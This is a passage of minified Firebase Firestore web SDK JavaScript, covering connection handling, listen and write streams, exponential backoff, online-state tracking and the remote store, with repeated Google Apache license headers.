Hg{constructor(){this.activeTargetIds=Wx()}fs(e){this.activeTargetIds=this.activeTargetIds.add(e)}gs(e){this.activeTargetIds=this.activeTargetIds.delete(e)}Vs(){const e={activeTargetIds:this.activeTargetIds.toArray(),updateTimeMs:Date.now()};return JSON.stringify(e)}}class Qk{constructor(){this.so=new Hg,this.oo={},this.onlineStateHandler=null,this.sequenceNumberHandler=null}addPendingMutation(e){}updateMutationState(e,n,r){}addLocalQueryTarget(e,n=!0){return n&&this.so.fs(e),this.oo[e]||"not-current"}updateQueryState(e,n,r){this.oo[e]=n}removeLocalQueryTarget(e){this.so.gs(e)}isLocalQueryTarget(e){return this.so.activeTargetIds.has(e)}clearQueryState(e){delete this.oo[e]}getAllActiveQueryTargets(){return this.so.activeTargetIds}isActiveQueryTarget(e){return this.so.activeTargetIds.has(e)}start(){return this.so=new Hg,Promise.resolve()}handleUserChange(e,n,r){}setOnlineState(e){}shutdown(){}writeSequenceNumber(e){}notifyBundleLoaded(e){}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Yk{_o(e){}shutdown(){}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Gg{constructor(){this.ao=()=>this.uo(),this.co=()=>this.lo(),this.ho=[],this.Po()}_o(e){this.ho.push(e)}shutdown(){window.removeEventListener("online",this.ao),window.removeEventListener("offline",this.co)}Po(){window.addEventListener("online",this.ao),window.addEventListener("offline",this.co)}uo(){G("ConnectivityMonitor","Network connectivity changed: AVAILABLE");for(const e of this.ho)e(0)}lo(){G("ConnectivityMonitor","Network connectivity changed: UNAVAILABLE");for(const e of this.ho)e(1)}static D(){return typeof window<"u"&&window.addEventListener!==void 0&&window.removeEventListener!==void 0}}/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let wa=null;function yc(){return wa===null?wa=function(){return 268435456+Math.round(2147483648*Math.random())}():wa++,"0x"+wa.toString(16)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Xk={BatchGetDocuments:"batchGet",Commit:"commit",RunQuery:"runQuery",RunAggregationQuery:"runAggregationQuery"};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Jk{constructor(e){this.Io=e.Io,this.To=e.To}Eo(e){this.Ao=e}Ro(e){this.Vo=e}mo(e){this.fo=e}onMessage(e){this.po=e}close(){this.To()}send(e){this.Io(e)}yo(){this.Ao()}wo(){this.Vo()}So(e){this.fo(e)}bo(e){this.po(e)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Ye="WebChannelConnection";class Zk extends class{constructor(n){this.databaseInfo=n,this.databaseId=n.databaseId;const r=n.ssl?"https":"http",i=encodeURIComponent(this.databaseId.projectId),s=encodeURIComponent(this.databaseId.database);this.Do=r+"://"+n.host,this.vo=`projects/${i}/databases/${s}`,this.Co=this.databaseId.database==="(default)"?`project_id=${i}`:`project_id=${i}&database_id=${s}`}get Fo(){return!1}Mo(n,r,i,s,o){const l=yc(),u=this.xo(n,r.toUriEncodedString());G("RestConnection",`Sending RPC '${n}' ${l}:`,u,i);const h={"google-cloud-resource-prefix":this.vo,"x-goog-request-params":this.Co};return this.Oo(h,s,o),this.No(n,u,h,i).then(f=>(G("RestConnection",`Received RPC '${n}' ${l}: `,f),f),f=>{throw Di("RestConnection",`RPC '${n}' ${l} failed with error: `,f,"url: ",u,"request:",i),f})}Lo(n,r,i,s,o,l){return this.Mo(n,r,i,s,o)}Oo(n,r,i){n["X-Goog-Api-Client"]=function(){return"gl-js/ fire/"+qi}(),n["Content-Type"]="text/plain",this.databaseInfo.appId&&(n["X-Firebase-GMPID"]=this.databaseInfo.appId),r&&r.headers.forEach((s,o)=>n[o]=s),i&&i.headers.forEach((s,o)=>n[o]=s)}xo(n,r){const i=Xk[n];return`${this.Do}/v1/${r}:${i}`}terminate(){}}{constructor(e){super(e),this.forceLongPolling=e.forceLongPolling,this.autoDetectLongPolling=e.autoDetectLongPolling,this.useFetchStreams=e.useFetchStreams,this.longPollingOptions=e.longPollingOptions}No(e,n,r,i){const s=yc();return new Promise((o,l)=>{const u=new x0;u.setWithCredentials(!0),u.listenOnce(k0.COMPLETE,()=>{try{switch(u.getLastErrorCode()){case Fa.NO_ERROR:const f=u.getResponseJson();G(Ye,`XHR for RPC '${e}' ${s} received:`,JSON.stringify(f)),o(f);break;case Fa.TIMEOUT:G(Ye,`RPC '${e}' ${s} timed out`),l(new H(O.DEADLINE_EXCEEDED,"Request time out"));break;case Fa.HTTP_ERROR:const p=u.getStatus();if(G(Ye,`RPC '${e}' ${s} failed with status:`,p,"response text:",u.getResponseText()),p>0){let g=u.getResponseJson();Array.isArray(g)&&(g=g[0]);const v=g==null?void 0:g.error;if(v&&v.status&&v.message){const A=function(N){const S=N.toLowerCase().replace(/_/g,"-");return Object.values(O).indexOf(S)>=0?S:O.UNKNOWN}(v.status);l(new H(A,v.message))}else l(new H(O.UNKNOWN,"Server responded with status "+u.getStatus()))}else l(new H(O.UNAVAILABLE,"Connection failed."));break;default:X()}}finally{G(Ye,`RPC '${e}' ${s} completed.`)}});const h=JSON.stringify(i);G(Ye,`RPC '${e}' ${s} sending request:`,i),u.send(n,"POST",h,r,15)})}Bo(e,n,r){const i=yc(),s=[this.Do,"/","google.firestore.v1.Firestore","/",e,"/channel"],o=D0(),l=N0(),u={httpSessionIdParam:"gsessionid",initMessageHeaders:{},messageUrlParams:{database:`projects/${this.databaseId.projectId}/databases/${this.databaseId.database}`},sendRawJson:!0,supportsCrossDomainXhr:!0,internalChannelParams:{forwardChannelRequestTimeoutMs:6e5},forceLongPolling:this.forceLongPolling,detectBufferingProxy:this.autoDetectLongPolling},h=this.longPollingOptions.timeoutSeconds;h!==void 0&&(u.longPollingTimeout=Math.round(1e3*h)),this.useFetchStreams&&(u.useFetchStreams=!0),this.Oo(u.initMessageHeaders,n,r),u.encodeInitMessageHeaders=!0;const f=s.join("");G(Ye,`Creating RPC '${e}' stream ${i}: ${f}`,u);const p=o.createWebChannel(f,u);let g=!1,v=!1;const A=new Jk({Io:N=>{v?G(Ye,`Not sending because RPC '${e}' stream ${i} is closed:`,N):(g||(G(Ye,`Opening RPC '${e}' stream ${i} transport.`),p.open(),g=!0),G(Ye,`RPC '${e}' stream ${i} sending:`,N),p.send(N))},To:()=>p.close()}),k=(N,S,_)=>{N.listen(S,R=>{try{_(R)}catch(V){setTimeout(()=>{throw V},0)}})};return k(p,Ts.EventType.OPEN,()=>{v||(G(Ye,`RPC '${e}' stream ${i} transport opened.`),A.yo())}),k(p,Ts.EventType.CLOSE,()=>{v||(v=!0,G(Ye,`RPC '${e}' stream ${i} transport closed`),A.So())}),k(p,Ts.EventType.ERROR,N=>{v||(v=!0,Di(Ye,`RPC '${e}' stream ${i} transport errored:`,N),A.So(new H(O.UNAVAILABLE,"The operation could not be completed")))}),k(p,Ts.EventType.MESSAGE,N=>{var S;if(!v){const _=N.data[0];ce(!!_);const R=_,V=R.error||((S=R[0])===null||S===void 0?void 0:S.error);if(V){G(Ye,`RPC '${e}' stream ${i} received error:`,V);const U=V.status;let j=function(T){const C=xe[T];if(C!==void 0)return rw(C)}(U),I=V.message;j===void 0&&(j=O.INTERNAL,I="Unknown error status: "+U+" with message "+V.message),v=!0,A.So(new H(j,I)),p.close()}else G(Ye,`RPC '${e}' stream ${i} received:`,_),A.bo(_)}}),k(l,P0.STAT_EVENT,N=>{N.stat===Sh.PROXY?G(Ye,`RPC '${e}' stream ${i} detected buffering proxy`):N.stat===Sh.NOPROXY&&G(Ye,`RPC '${e}' stream ${i} detected no buffering proxy`)}),setTimeout(()=>{A.wo()},0),A}}function vc(){return typeof document<"u"?document:null}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function nu(t){return new uk(t,!0)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class mw{constructor(e,n,r=1e3,i=1.5,s=6e4){this.ui=e,this.timerId=n,this.ko=r,this.qo=i,this.Qo=s,this.Ko=0,this.$o=null,this.Uo=Date.now(),this.reset()}reset(){this.Ko=0}Wo(){this.Ko=this.Qo}Go(e){this.cancel();const n=Math.floor(this.Ko+this.zo()),r=Math.max(0,Date.now()-this.Uo),i=Math.max(0,n-r);i>0&&G("ExponentialBackoff",`Backing off for ${i} ms (base delay: ${this.Ko} ms, delay with jitter: ${n} ms, last attempt: ${r} ms ago)`),this.$o=this.ui.enqueueAfterDelay(this.timerId,i,()=>(this.Uo=Date.now(),e())),this.Ko*=this.qo,this.Ko<this.ko&&(this.Ko=this.ko),this.Ko>this.Qo&&(this.Ko=this.Qo)}jo(){this.$o!==null&&(this.$o.skipDelay(),this.$o=null)}cancel(){this.$o!==null&&(this.$o.cancel(),this.$o=null)}zo(){return(Math.random()-.5)*this.Ko}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class gw{constructor(e,n,r,i,s,o,l,u){this.ui=e,this.Ho=r,this.Jo=i,this.connection=s,this.authCredentialsProvider=o,this.appCheckCredentialsProvider=l,this.listener=u,this.state=0,this.Yo=0,this.Zo=null,this.Xo=null,this.stream=null,this.e_=0,this.t_=new mw(e,n)}n_(){return this.state===1||this.state===5||this.r_()}r_(){return this.state===2||this.state===3}start(){this.e_=0,this.state!==4?this.auth():this.i_()}async stop(){this.n_()&&await this.close(0)}s_(){this.state=0,this.t_.reset()}o_(){this.r_()&&this.Zo===null&&(this.Zo=this.ui.enqueueAfterDelay(this.Ho,6e4,()=>this.__()))}a_(e){this.u_(),this.stream.send(e)}async __(){if(this.r_())return this.close(0)}u_(){this.Zo&&(this.Zo.cancel(),this.Zo=null)}c_(){this.Xo&&(this.Xo.cancel(),this.Xo=null)}async close(e,n){this.u_(),this.c_(),this.t_.cancel(),this.Yo++,e!==4?this.t_.reset():n&&n.code===O.RESOURCE_EXHAUSTED?(An(n.toString()),An("Using maximum backoff delay to prevent overloading the backend."),this.t_.Wo()):n&&n.code===O.UNAUTHENTICATED&&this.state!==3&&(this.authCredentialsProvider.invalidateToken(),this.appCheckCredentialsProvider.invalidateToken()),this.stream!==null&&(this.l_(),this.stream.close(),this.stream=null),this.state=e,await this.listener.mo(n)}l_(){}auth(){this.state=1;const e=this.h_(this.Yo),n=this.Yo;Promise.all([this.authCredentialsProvider.getToken(),this.appCheckCredentialsProvider.getToken()]).then(([r,i])=>{this.Yo===n&&this.P_(r,i)},r=>{e(()=>{const i=new H(O.UNKNOWN,"Fetching auth token failed: "+r.message);return this.I_(i)})})}P_(e,n){const r=this.h_(this.Yo);this.stream=this.T_(e,n),this.stream.Eo(()=>{r(()=>this.listener.Eo())}),this.stream.Ro(()=>{r(()=>(this.state=2,this.Xo=this.ui.enqueueAfterDelay(this.Jo,1e4,()=>(this.r_()&&(this.state=3),Promise.resolve())),this.listener.Ro()))}),this.stream.mo(i=>{r(()=>this.I_(i))}),this.stream.onMessage(i=>{r(()=>++this.e_==1?this.E_(i):this.onNext(i))})}i_(){this.state=5,this.t_.Go(async()=>{this.state=0,this.start()})}I_(e){return G("PersistentStream",`close with error: ${e}`),this.stream=null,this.close(4,e)}h_(e){return n=>{this.ui.enqueueAndForget(()=>this.Yo===e?n():(G("PersistentStream","stream callback skipped by getCloseGuardedDispatcher."),Promise.resolve()))}}}class eP extends gw{constructor(e,n,r,i,s,o){super(e,"listen_stream_connection_backoff","listen_stream_idle","health_check_timeout",n,r,i,o),this.serializer=s}T_(e,n){return this.connection.Bo("Listen",e,n)}E_(e){return this.onNext(e)}onNext(e){this.t_.reset();const n=dk(this.serializer,e),r=function(s){if(!("targetChange"in s))return Z.min();const o=s.targetChange;return o.targetIds&&o.targetIds.length?Z.min():o.readTime?en(o.readTime):Z.min()}(e);return this.listener.d_(n,r)}A_(e){const n={};n.database=Vh(this.serializer),n.addTarget=function(s,o){let l;const u=o.target;if(l=xh(u)?{documents:mk(s,u)}:{query:gk(s,u)._t},l.targetId=o.targetId,o.resumeToken.approximateByteSize()>0){l.resumeToken=ow(s,o.resumeToken);const h=Nh(s,o.expectedCount);h!==null&&(l.expectedCount=h)}else if(o.snapshotVersion.compareTo(Z.min())>0){l.readTime=Cl(s,o.snapshotVersion.toTimestamp());const h=Nh(s,o.expectedCount);h!==null&&(l.expectedCount=h)}return l}(this.serializer,e);const r=vk(this.serializer,e);r&&(n.labels=r),this.a_(n)}R_(e){const n={};n.database=Vh(this.serializer),n.removeTarget=e,this.a_(n)}}class tP extends gw{constructor(e,n,r,i,s,o){super(e,"write_stream_connection_backoff","write_stream_idle","health_check_timeout",n,r,i,o),this.serializer=s}get V_(){return this.e_>0}start(){this.lastStreamToken=void 0,super.start()}l_(){this.V_&&this.m_([])}T_(e,n){return this.connection.Bo("Write",e,n)}E_(e){return ce(!!e.streamToken),this.lastStreamToken=e.streamToken,ce(!e.writeResults||e.writeResults.length===0),this.listener.f_()}onNext(e){ce(!!e.streamToken),this.lastStreamToken=e.streamToken,this.t_.reset();const n=pk(e.writeResults,e.commitTime),r=en(e.commitTime);return this.listener.g_(r,n)}p_(){const e={};e.database=Vh(this.serializer),this.a_(e)}m_(e){const n={streamToken:this.lastStreamToken,writes:e.map(r=>fk(this.serializer,r))};this.a_(n)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class nP extends class{}{constructor(e,n,r,i){super(),this.authCredentials=e,this.appCheckCredentials=n,this.connection=r,this.serializer=i,this.y_=!1}w_(){if(this.y_)throw new H(O.FAILED_PRECONDITION,"The client has already been terminated.")}Mo(e,n,r,i){return this.w_(),Promise.all([this.authCredentials.getToken(),this.appCheckCredentials.getToken()]).then(([s,o])=>this.connection.Mo(e,Dh(n,r),i,s,o)).catch(s=>{throw s.name==="FirebaseError"?(s.code===O.UNAUTHENTICATED&&(this.authCredentials.invalidateToken(),this.appCheckCredentials.invalidateToken()),s):new H(O.UNKNOWN,s.toString())})}Lo(e,n,r,i,s){return this.w_(),Promise.all([this.authCredentials.getToken(),this.appCheckCredentials.getToken()]).then(([o,l])=>this.connection.Lo(e,Dh(n,r),i,o,l,s)).catch(o=>{throw o.name==="FirebaseError"?(o.code===O.UNAUTHENTICATED&&(this.authCredentials.invalidateToken(),this.appCheckCredentials.invalidateToken()),o):new H(O.UNKNOWN,o.toString())})}terminate(){this.y_=!0,this.connection.terminate()}}class rP{constructor(e,n){this.asyncQueue=e,this.onlineStateHandler=n,this.state="Unknown",this.S_=0,this.b_=null,this.D_=!0}v_(){this.S_===0&&(this.C_("Unknown"),this.b_=this.asyncQueue.enqueueAfterDelay("online_state_timeout",1e4,()=>(this.b_=null,this.F_("Backend didn't respond within 10 seconds."),this.C_("Offline"),Promise.resolve())))}M_(e){this.state==="Online"?this.C_("Unknown"):(this.S_++,this.S_>=1&&(this.x_(),this.F_(`Connection failed 1 times. Most recent error: ${e.toString()}`),this.C_("Offline")))}set(e){this.x_(),this.S_=0,e==="Online"&&(this.D_=!1),this.C_(e)}C_(e){e!==this.state&&(this.state=e,this.onlineStateHandler(e))}F_(e){const n=`Could not reach Cloud Firestore backend. ${e}
This typically indicates that your device does not have a healthy Internet connection at the moment. The client will operate in offline mode until it is able to successfully connect to the backend.`;this.D_?(An(n),this.D_=!1):G("OnlineStateTracker",n)}x_(){this.b_!==null&&(this.b_.cancel(),this.b_=null)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class iP{constructor(e,n,r,i,s){this.localStore=e,this.datastore=n,this.asyncQueue=r,this.remoteSyncer={},this.O_=[],this.N_=new Map,this.L_=new Set,this.B_=[],this.k_=s,this.k_._o(o=>{r.enqueueAndForget(async()=>{Wr(this)&&(G("RemoteStore","Restarting streams for network reachability change."),await async function(u){const h=ee(u);h.L_.add(4),await Do(h),h.q_.set("Unknown"),h.L_.delete(4),await ru(h)}(this))})}),this.q_=new rP(r,i)}}async function ru(t){if(Wr(t))for(const e of t.B_)await e(!0)}async function Do(t){for(const e of t.B_)await e(!1)}function yw(t,e){const n=ee(t);n.N_.has(e.targetId)||(n.N_.set(e.targetId,e),yf(n)?gf(n):Gi(n).r_()&&mf(n,e))}function pf(t,e){const n=ee(t),r=Gi(n);n.N_.delete(e),r.r_()&&vw(n,e),n.N_.size===0&&(r.r_()?r.o_():Wr(n)&&n.q_.set("Unknown"))}function mf(t,e){if(t.Q_.xe(e.targetId),e.resumeToken.approximateByteSize()>0||e.snapshotVersion.compareTo(Z.min())>0){const n=t.remoteSyncer.getRemoteKeysForTarget(e.targetId).size;e=e.withExpectedCount(n)}Gi(t).A_(e)}function vw(t,e){t.Q_.xe(e),Gi(t).R_(e)}function gf(t){t.Q_=new sk({getRemoteKeysForTarget:e=>t.remoteSyncer.getRemoteKeysForTarget(e),ot:e=>t.N_.get(e)||null,tt:()=>t.datastore.serializer.databaseId}),Gi(t).start(),t.q_.v_()}function yf(t){return Wr(t)&&!Gi(t).n_()&&t.N_.size>0}function Wr(t){return ee(t).L_.size===0}function _w(t){t.Q_=void 0}async function sP(t){t.q_.set("Online")}async function oP(t){t.N_.forEach((e,n)=>{mf(t,e)})}async function aP(t,e){_w(t),yf(t)?(t.q_.M_(e),gf(t)):t.q_.set("Unknown")}async function lP(t,e,n){if(t.q_.set("Online"),e instanceof sw&&e.state===2&&e.cause)try{await async function(i,s){const o=s.cause;for(const l of s.targetIds)i.N_.has(l)&&(await i.remoteSyncer.rejectListen(l,o),i.N_.delete(l),i.Q_.removeTarget(l))}(t,e)}catch(r){G("RemoteStore","Failed to remove targets %s: %s ",e.targetIds.join(","),r),await Rl(t,r)}else if(e instanceof za?t.Q_.Ke(e):e instanceof iw?t.Q_.He(e):t.Q_.We(e),!n.isEqual(Z.min()))try{const r=await pw(t.localStore);n.compareTo(r)>=0&&await function(s,o){const l=s.Q_.rt(o);return l.targetChanges.forEach((u,h)=>{if(u.resumeToken.approximateByteSize()>0){const f=s.N_.get(h);f&&s.N_.set(h,f.withResumeToken(u.resumeToken,o))}}),l.targetMismatches.forEach((u,h)=>{const f=s.N_.get(u);if(!f)return;s.N_.set(u,f.withResumeToken(We.EMPTY_BYTE_STRING,f.snapshotVersion)),vw(s,u);const p=new Hn(f.target,u,h,f.sequenceNumber);mf(s,p)}),s.remoteSyncer.applyRemoteEvent(l)}(t,n)}catch(r){G("RemoteStore","Failed to raise snapshot:",r),await Rl(t,r)}}async function Rl(t,e,n){if(!xo(e))throw e;t.L_.add(1),await Do(t),t.q_.set("Offline"),n||(n=()=>pw(t.localStore)),t.asyncQueue.enqueueRetryable(async()=>{G("RemoteStore","Retrying IndexedDB access"),await n(),t.L_.delete(1),await ru(t)})}function ww(t,e){return e().catch(n=>Rl(t,n,e))}async function iu(t){const e=ee(t),n=ur(e);let r=e.O_.length>0?e.O_[e.O_.length-1].batchId:-1;for(;uP(e);)try{const i=await Hk(e.localStore,r);if(i===null){e.O_.length===0&&n.o_();break}r=i.batchId,cP(e,i)}catch(i){await Rl(e,i)}Ew(e)&&Tw(e)}function uP(t){return Wr(t)&&t.O_.length<10}function cP(t,e){t.O_.push(e);const n=ur(t);n.r_()&&n.V_&&n.m_(e.mutations)}function Ew(t){return Wr(t)&&!ur(t).n_()&&t.O_.length>0}function Tw(t){ur(t).start()}async function hP(t){ur(t).p_()}async function dP(t){const e=ur(t);for(const n of t.O_)e.m_(n.mutations)}async function fP(t,e,n){const r=t.O_.shift(),i=lf.from(r,e,n);await ww(t,()=>t.remoteSyncer.applySuccessfulWrite(i)),await iu(t)}async function pP(t,e){e&&ur(t).V_&&await async function(r,i){if(function(o){return nk(o)&&o!==O.ABORTED}(i.code)){const s=r.O_.shift();ur(r).s_(),await ww(r,()=>r.remoteSyncer.rejectFailedWrite(s.batchId,i)),await iu(r)}}(t,e),Ew(t)&&Tw(t)}async function Kg(t,e){const n=ee(t);n.asyncQueue.verifyOperationInProgress(),G("RemoteStore","RemoteStore received new credentials");const r=Wr(n);n.L_.add(3),await Do(n),r&&n.q_.set("Unknown"),await n.remoteSyncer.handleCredentialChange(e),n.L_.delete(3),await ru(n)}async function mP(t,e){const n=ee(t);e?(n.L_.delete(2),await ru(n)):e||(n.L_.add(2),await Do(n),n.q_.set("Unknown"))}function Gi(t){return t.K_||(t.K_=function(n,r,i){const s=ee(n);return s.w_(),new eP(r,s.connection,s.authCredentials,s.appCheckCredentials,s.serializer,i)}(t.datastore,t.asyncQueue,{Eo:sP.bind(null,t),Ro:oP.bind(null,t),mo:aP.bind(null,t),d_:lP.bind(null,t)}),t.B_.push(async e=>{e?(t.K_.s_(),yf(t)?gf(t):t.q_.set("Unknown")):(await t.K_.stop(),_w(t))})),t.K_}function ur(t){return t.U_||(t.U_=function(n,r,i){const s=ee(n);return s.w_(),new tP(r,s.connection,s.authCredentials,s.appCheckCredentials,s.serializer,i)}(t.datastore,t.asyncQueue,{Eo:()=>Promise.resolve(),Ro:hP.bind(null,t),mo:pP.bind(null,t),f_:dP.bind(null,t),g_:fP.bind(null,t)}),t.B_.push(async e=>{e?(t.U_.s_(),await iu(t)):(await t.U_.stop(),t.O_.length>0&&(G("RemoteStore",`Stopping write stream with ${t.O_.length} pending writes`),t.O_=[]))})),t.U_}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class vf{constructor(e,n,r,i,s){this.asyncQueue=e,this.timerId=n,this.targetTimeMs=r,this.op=i,this.removalCallback=s,this.deferred=new yn,this.then=this.deferred.promise.then.bind(this.deferred.promise),this.deferred.promise.catch(o=>{})}get promise(){return this.deferred.promise}static createAndSchedule(e,n,r,i,s){const o=Date.now()+r,l=new vf(e,n,o,i,s);return l.start(r),l}start(e){this.timerHandle=setTimeout(()=>this.handleDelayElapsed(),e)}skipDelay(){return this.handleDelayElapsed()}cancel(e){this.timerHandle!==null&&(this.clearTimeout(),this.deferred.reject(new H(O.CANCELLED,"Operation cancelled"+(e?": "+e:""))))}handleDelayElapsed(){this.asyncQueue.enqueueAndForget(()=>this.timerHandle!==null?(this.clearTimeout(),this.op().then(e=>this.deferred.resolve(e))):Promise.resolve())}clearTimeout(){this.timerHandle!==null&&(this.removalCallback(this),clearTimeout(this.timerHandle),this.timerHandle=null)}}function _f(t,e){if(An("AsyncQueue",`${e}: ${t}`),xo(t))return new H(O.UNAVAILABLE,`${e}: ${t}`);throw t}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ti{constructor(e){this.comparator=e?(n,r)=>e(n,r)||K.comparator(n.key,r.key):(n,r)=>K.comparator(n.key,r.key),this.keyedMap=Is(),this.sortedSet=new Ie(this.comparator)}static emptySet(e){return new Ti(e.comparator)}has(e){return this.keyedMap.get(e)!=null}get(e){return this.keyedMap.get(e)}first(){return this.sortedSet.minKey()}last(){return this.sortedSet.maxKey()}isEmpty(){return this.sortedSet.isEmpty()}indexOf(e){const n=this.keyedMap.get(e);return n?this.sortedSet.indexOf(n):-1}get size(){return this.sortedSet.size}forEach(e){this.sortedSet.inorderTraversal((n,r)=>(e(n),!1))}add(e){const n=this.delete(e.key);return n.copy(n.keyedMap.insert(e.key,e),n.sortedSet.insert(e,null))}delete(e){const n=this.get(e);return n?this.copy(this.keyedMap.remove(e),this.sortedSet.remove(n)):this}isEqual(e){if(!(e instanceof Ti)||this.size!==e.size)return!1;const n=this.sortedSet.getIterator(),r=e.sortedSet.getIterator();for(;n.hasNext();){const i=n.getNext().key,s=r.getNext().key;if(!i.isEqual(s))return!1}return!0}toString(){const e=[];return this.forEach(n=>{e.push(n.toString())}),e.length===0?"DocumentSet ()":`DocumentSet (
  `+e.join(`  
`)+`
)`}copy(e,n){const r=new Ti;return r.comparator=this.comparator,r.keyedMap=e,r.sortedSet=n,r}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
